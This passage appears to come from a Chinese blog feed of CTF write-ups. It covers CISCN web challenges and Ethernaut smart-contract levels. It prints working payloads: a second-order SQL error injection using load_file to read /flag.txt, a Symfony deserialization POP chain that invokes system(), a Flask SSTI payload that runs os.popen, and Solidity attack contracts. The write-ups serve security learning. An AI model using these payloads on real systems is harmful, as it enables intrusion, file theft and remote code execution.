class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åä¿®æ¹æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>search.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.$row[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.$row[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题奇怪的点在于，对user_name和phone都进行了很好的过滤，但是对address却只有一层转义</p><p>那么这个address就可以用来注入了</p><p>这里虽然被转义了，但是从代码中可以看到，修改后之前的地址也会保存下来，那么如果写入payload，那么在第二次修改的时候就可以出发报错注入。</p><p>payload;</p><blockquote><p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),1,20)),0x7e),1)#</p><p>1’ where user_id=updatexml(1,concat(0x7e,(select substr(load_file(‘/flag.txt’),20,50)),0x7e),1)#</p></blockquote><p>这里读表读了半天没有flag，看了大佬博客才知道要load_file</p><h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>知识点：</p><ul><li>PHP反序列化</li></ul><p>单纯的反序列化，就是项目挺大，找POP链还是不太容易</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request $request</span>)</span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用Seay工具全局搜索<code>__destuct()</code>，需要找到一个有可变参数的<code>__destuct()</code>，最终在<code>TagAwareAdapter</code>类中找到</p><p><img src= "/img/loading.gif" data-lazy-src="/4.png"></p><p>跟进<code>commit</code>函数</p><p><img src= "/img/loading.gif" data-lazy-src="/4.png"></p><p>再跟进<code>invalidateTags([])</code></p><p><img src= "/img/loading.gif" data-lazy-src="/5.png"></p><p>其他都很正常，但是<code>$this-&gt;pool-&gt;saveDeferred($item)</code>这里，调用了外部类的方法，搜索一下<code>$this-&gt;pool。</code></p><p><img src= "/img/loading.gif" data-lazy-src="/6.png"></p><p>可以看到这个类需要实现<code>AdapterInterface</code>接口，我们直接全局搜索<code>saveDeferred</code>函数，然后通过是否有<code>AdapterInterface</code>接口来进行排除，就剩下不多了，在通过有无利用点，确定了<code>ProxyAdapter</code>这个类，在这个类中找<code>saveDeferred</code></p><p><img src= "/img/loading.gif" data-lazy-src="/7.png"></p><p>然后跟进<code>doSave</code></p><p><img src= "/img/loading.gif" data-lazy-src="/8.png"></p><p>我们会惊奇的发现，这里是可以利用的。要利用的话就要保证<code>setInnerItem和innerItem</code>可控，<code>setInnerItem</code>就在类中，<code>innerItem</code>通过下面这个语句可以发现，我们需要给到一个有<code>innerItem</code>参数的类</p><p><img src= "/img/loading.gif" data-lazy-src="/9.png"></p><p>继续全局搜索<code>innerItem</code>，然后确定了<code>CacheItem</code>类</p><p><img src= "/img/loading.gif" data-lazy-src="/10.png"></p><p>接下来的事情就简单了，构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $deferred;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred = <span class="keyword">array</span>(<span class="string">&#x27;hack&#x27;</span> =&gt; <span class="keyword">new</span> \Symfony\Component\Cache\CacheItem);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>然后发送payload就可以<code>getflag</code></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>知识点：</p><ul><li>Flask SSTI</li><li>RC4解密</li></ul><p><img src= "/img/loading.gif" data-lazy-src="/11.png"></p><p>根据这里猜测有<code>secret</code>页面</p><p><img src= "/img/loading.gif" data-lazy-src="/12.png"></p><p>果然，然后传参，没试出什么规律，然后乱打一通打出了报错</p><p><img src= "/img/loading.gif" data-lazy-src="/13.png"></p><p>然后找到了加密的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame </span><br></pre></td></tr></table></figure><p>没想到还挺简单的，就是个RC4加密，密钥就是<code>HereIsTreasure</code>找个脚本</p><p>然后看到这里有个<code>render_template_string</code>，看不懂，但是有个template，觉得应该是跟模板有关，用SSTI的payload加密一下传上去</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷题记录&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
  </entry>
  
  <entry>
    <title>智能合约安全入门:ETHERNAUT-WriteUp(3)</title>
    <link href="http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/"/>
    <id>http://yoursite.com/2020/05/17/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-ETHERNAUT-WriteUp-3/</id>
    <published>2020-05-17T08:14:14.000Z</published>
    <updated>2020-07-18T07:04:00.379Z</updated>
    
    <content type="html"><![CDATA[<p>本来说下次一定（咕咕咕），突然周天又没啥事情，干脆做完好了。</p><a id="more"></a><h2 id="0x00-Naught-Coin"><a href="#0x00-Naught-Coin" class="headerlink" title="0x00 Naught Coin"></a>0x00 Naught Coin</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/token/ERC20/StandardToken.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  string public constant name = <span class="string">&#x27;NaughtCoin&#x27;</span>;</span><br><span class="line">  string public constant symbol = <span class="string">&#x27;0x0&#x27;</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = (<span class="number">10</span> ** decimals).mul(<span class="number">1000000</span>);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题题目说明：</p><blockquote><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p><p> Things that might help</p><ul><li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li><li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li></ul></blockquote><p>给了框架源码和接口文档，源码是不可能去看的（懒），看看接口。</p><p>这道题的目的是置0自己的<code>token balance</code>，合约里面有一个<code>transfer</code>函数，但是有一个<code>modifier</code>做限制，10年之后才能转出去，drl。</p><p>接口文档中除了有<code>transfer</code>函数之外，还有一个<code>transferFrom</code>，这个函数合约中没有实现，所以直接调用就可以绕过<code>modifier</code>。</p><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p>但是这个<code>transferFrom</code>需要授权。接着往下看就找到了可以用的一个方法：<code>approve</code></p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>然后就很清晰了，先授权，再转账</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.approve(player,<span class="number">1000000000000000000000000</span>)</span><br><span class="line"></span><br><span class="line">contract.transferFrom(player,contract.address,<span class="number">1000000000000000000000000</span>)</span><br></pre></td></tr></table></figure><h2 id="0x01-Preservation"><a href="#0x01-Preservation" class="headerlink" title="0x01 Preservation"></a>0x01 Preservation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要改变owner，但是这里好像没有什么可以控制owner的地方，根据给出的提示，在<code>delegatecall</code>上面思考，之前提到了<code>delegatecall</code>的特性，他的一个重要的地方就是，当一个合约调用另外一个合约中的方法时，所使用的<code> storage</code>会是调用方的<code> storage</code>，这样的一个特性就可以用来解这道题目。</p><p>首先，这里<code>Preservation</code>合约的<code>setFirstTime</code>中调用了<code>LibraryContract</code>中的方法，这时，<code>setTime</code>函数中给<code>storedTime</code>赋值，但由于上文提到的特性，在实际存储上修改的是<code>timeZone1Library</code>的值。</p><p>所以攻击思路就清晰了，首先调用<code>setFirstTime</code>来将攻击合约的地址赋值给<code>timeZone1Library</code>，然后再次调用<code>setFirstTime</code>去执行攻击代码。</p><p>攻击合约代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner=address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我没有成功，讲道理，不知道为什么，方法应该是没有问题的。</p><h2 id="0x02-Locked"><a href="#0x02-Locked" class="headerlink" title="0x02 Locked"></a>0x02 Locked</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = <span class="literal">false</span>;  <span class="comment">// 